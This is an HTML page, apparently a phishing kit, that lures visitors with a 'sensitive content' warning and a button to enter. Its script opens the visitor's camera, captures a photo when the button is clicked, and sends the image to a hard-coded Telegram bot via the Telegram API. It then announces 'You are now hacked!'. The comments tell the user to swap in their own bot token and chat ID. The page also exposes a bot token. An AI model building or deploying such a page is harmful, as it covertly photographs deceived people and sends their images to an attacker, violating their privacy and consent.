<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>sensitive content😂</title>
    <style>
        body { text-align: center; font-family: Arial; background: #111; color: white; margin: 0; padding: 20px; }
        h1 { color: #ff4444; }
        video { width: 95%; max-width: 420px; border: 4px solid #fff; border-radius: 10px; }
        button { padding: 18px 40px; font-size: 22px; background: #00cc00; color: white; border: none; border-radius: 50px; margin: 20px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>💀sensitive content</h1>
    <video id="video" autoplay playsinline></video><br>
    <button onclick="takePhoto()">Warning: Do you really want to enter?/button>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const BOT_TOKEN = "8875338532:AAGPUmgVySBChH_5ZGh0-u9pclGVXXX1ZiM";   // غير هذا
        const CHAT_ID = "7876122259";         // غير هذا

        // تشغيل الكاميرا
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { video.srcObject = stream; })
            .catch(err => alert("Are you confident?"));

        function takePhoto() {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            const photoData = canvas.toDataURL('image/jpeg', 0.8);

            // إرسال الصورة إلى تليجرام
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    photo: photoData,
                    caption: 'صورة جديدة من الرابط 😂'
                })
            })
            .then(() => alert('You are now hacked!'))
            .catch(err => alert('حدث خطأ في الإرسال'));
        }
    </script>
</body>
</html>
